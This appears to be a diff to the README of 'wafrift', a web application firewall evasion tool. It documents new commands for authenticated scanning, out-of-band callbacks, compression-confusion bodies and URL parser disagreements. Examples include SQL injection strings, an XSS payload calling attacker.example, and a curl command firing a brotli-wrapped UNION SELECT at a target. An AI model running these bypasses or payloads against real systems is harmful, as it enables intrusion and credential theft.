@@ -15,11 +15,15 @@
 ## What's in the box
 
 - **`wafrift evade`** — offline payload mutator. Pipe a payload in, get N bypass variants out. Every encoding strategy and grammar dialect is addressable as a path (`encoding/url/triple`, `grammar/sql/tautology`) for `--only` / `--exclude`.
-- **`wafrift scan`** — fire variants at a live target, classify each response with a multi-signal oracle (block / bypass / challenge / rate-limit), respect server `Retry-After`, surface winning chains.
+- **`wafrift scan`** — fire variants at a live target, classify each response with a multi-signal oracle (block / bypass / challenge / rate-limit), respect server `Retry-After`, surface winning chains. `--session-init <CURL_FILE>` runs an auth-phase request first and replays the resulting cookies on every variant — the **stateful chain mode** real exploits use. `--callback-url URL` substitutes `{{CALLBACK}}` in the payload with a per-variant token to verify blind/stored vulns at a `wafrift listener`. `--payload-class CLASS` warm-starts the per-class gene-bank winners.
 - **`wafrift detect`** — fingerprint the WAF in front of a target (160+ vendors via TOML rules derived from wafw00f + identYwaf + locally researched additions).
 - **`wafrift discover`** — parse OpenAPI / GraphQL introspection / parameter-mine a single endpoint into a deduplicated `DiscoveredEndpoint` list with `ParameterLocation` + `InjectionContext` — feed straight into `scan`.
 - **`wafrift bypass-probe`** — Tsai-class differential auth/path/method bypass scanner. 136 auth-bypass header probes, full path-routing-disagreement family, method overrides. Sorted divergence report with reproduce-it `curl` commands.
-- **`wafrift-proxy`** — forward HTTP proxy. Chain Burp / Caido / mitmproxy → wafrift-proxy → target; wafrift applies evasion at the upstream forward and records bypasses to its gene bank. MITM mode + TLS impersonation + per-host adaptive rotation + live TUI dashboard.
+- **`wafrift parser-diff`** — URL-shape variants exercising known WAF↔origin parser disagreements (semicolon-strip, backslash-as-separator, NUL truncation, double-URL-decode, fullwidth slash, dot-segment, percent case, empty-segment collapse, trailing dot). A divergence is evidence the WAF and origin disagree on what the URL means — exploit the seam without any payload mutation.
+- **`wafrift compress`** — wrap a request body in `Content-Encoding: gzip` / `deflate` / `br` (or chain them). Compression-confusion attack: most WAFs inspect raw bytes; brotli especially is widely unsupported in WAF decompressors while every modern origin handles it. Operator pipes a body in, gets compressed bytes + the matching header out.
+- **`wafrift listener`** — OOB callback receiver. Pre-mints 128-bit base32 tokens; any inbound HTTP request containing a token is logged. The oracle for blind SQLi (time-based), stored XSS, blind SSRF, OOB cmdi — vuln classes that never echo a verdict on the same response.
+- **`wafrift legendary`** — one-shot demo command. Runs detect → fingerprint → bypass-probe (and optionally scan) against a single target, stitches the results into one polished markdown writeup. The fastest way to show what wafrift does.
+- **`wafrift-proxy`** — forward HTTP proxy. Chain Burp / Caido / mitmproxy → wafrift-proxy → target; wafrift applies evasion at the upstream forward and records bypasses to its gene bank. MITM mode + TLS impersonation (Chrome / Firefox / Safari ClientHellos, with **header-order coherence** so the wire matches the chosen browser end-to-end) + per-host adaptive rotation + live TUI dashboard.
 - **`wafrift replay`** — deterministic re-fire of a known-good bypass against any target. Exits 0 on bypass, 2 on block.
 
 Built so each crate is usable standalone: [`wafrift-encoding`](https://docs.rs/wafrift-encoding), [`wafrift-grammar`](https://docs.rs/wafrift-grammar), [`wafrift-detect`](https://docs.rs/wafrift-detect), [`wafrift-smuggling`](https://docs.rs/wafrift-smuggling), [`wafrift-evolution`](https://docs.rs/wafrift-evolution), [`wafrift-oracle`](https://docs.rs/wafrift-oracle), [`wafrift-strategy`](https://docs.rs/wafrift-strategy). No façade required.
@@ -174,6 +178,101 @@ wafrift replay --target https://target.com --param id \
 > Genomes only exist for WAFs you've previously scanned. Out-of-the-box
 > there are no pre-shipped vendor genomes; first scan against any new
 > WAF goes through full discovery.
+
+### 🔐 Authenticated app: "scan an admin panel that needs a login first"
+
+The two-phase real-attack pattern. Paste the login request from Burp's
+"Copy as cURL" into a file, hand it to `--session-init`, and every
+subsequent variant request carries the captured cookies + Authorization:
+
+```bash
+# 1. Capture the login curl from Burp / Chromium devtools.
+xclip -o > /tmp/login.curl
+
+# 2. Scan the protected endpoint with the established session.
+wafrift scan --target https://target.com/admin/users \
+    --payload "' OR 1=1--" --param id \
+    --session-init /tmp/login.curl
+```
+
+Defeats WAFs that scrutinise unauthenticated traffic more (most do).
+Re-uses `import-curl`'s curl parser — same syntax you'd hand `wafrift
+import-curl --evade`. Cookies are captured from every `Set-Cookie`
+the login chain produces (including redirects) AND any `Cookie:` /
+`Authorization:` you set in the curl itself. The most-recent cookie
+wins on name collision (browser semantics).
+
+### 👁️ Blind / stored vulns: "the payload lands but the response says nothing"
+
+For blind SQLi (time-based), stored XSS, blind SSRF, and OOB command
+injection — the response that triggers the vuln NEVER carries the
+verdict. Start a `wafrift listener` on infrastructure you control,
+embed `{{CALLBACK}}` in the payload, and `wafrift scan` substitutes a
+per-variant token. Any inbound hit at the listener with a matching
+token = verified bypass.
+
+```bash
+# Terminal A: stand up the listener (loopback by default; bind
+# 0.0.0.0:9000 for external targets you control).
+wafrift listener --bind 0.0.0.0:9000
+
+# Terminal B: scan with the callback substitution.
+wafrift scan --target https://target.com/comments \
+    --payload '<img src="{{CALLBACK}}/x.png">' --param body \
+    --callback-url http://attacker.example:9000
+```
+
+Terminal A logs each callback with the matched token; cross-reference
+with the per-variant tokens printed by `wafrift scan` to identify
+which variant landed.
+
+### 🛠️ Compression-confusion bodies: "the WAF inspects bytes; the origin decompresses"
+
+```bash
+# Pipe a payload through gzip + brotli — outermost first per RFC 9110 §8.4.
+echo -n "' UNION SELECT username,password FROM users--" \
+    | wafrift compress --algo gzip --algo br > /tmp/body.bin
+# stderr: Content-Encoding: gzip, br
+
+# Fire with curl: the body bytes are compressed-then-compressed; the
+# WAF sees binary noise, the origin (nginx + brotli module) decodes
+# both layers and processes the SQLi normally.
+curl -X POST https://target.com/api/users \
+    -H 'Content-Type: application/json' \
+    -H 'Content-Encoding: gzip, br' \
+    --data-binary @/tmp/body.bin
+```
+
+Brotli is the headline gap: many WAFs ship gzip/deflate decompressors
+but no brotli decoder, while origins (Chrome 49+ / nginx 1.11+ /
+Apache mod_brotli) all handle it. `wafrift compress --algo br` is
+often enough on its own.
+
+### 🔬 Parser disagreements: "find the seam between WAF and origin URL parsers"
+
+```bash
+# Fire 16 URL-shape variants (semicolon-strip, backslash-as-separator,
+# NUL truncation, double-URL-decode, fullwidth slash, dot-segment,
+# percent case, empty-segment collapse, trailing dot) against the
+# protected path. A divergence vs the baseline = the WAF and origin
+# disagree on what /admin means.
+wafrift parser-diff https://target.com/admin --format json > /tmp/diff.json
+```
+
+`wafrift bypass-probe` covers the auth-header / method-override
+side; `parser-diff` covers the URL-shape side. They compose.
+
+### 📰 One-shot writeup: "what does wafrift see end-to-end?"
+
+```bash
+# detect -> fingerprint -> bypass-probe -> (scan) -> polished markdown.
+wafrift legendary https://target.com --output report.md
+# For the deeper sweep: pass --payload to enable the live-scan phase.
+wafrift legendary https://target.com --payload "' OR 1=1--" --param id \
+    --output report.md
+```
+
+The fastest way to show a stakeholder what wafrift does in one command.
 
 ### Five common shapes
 
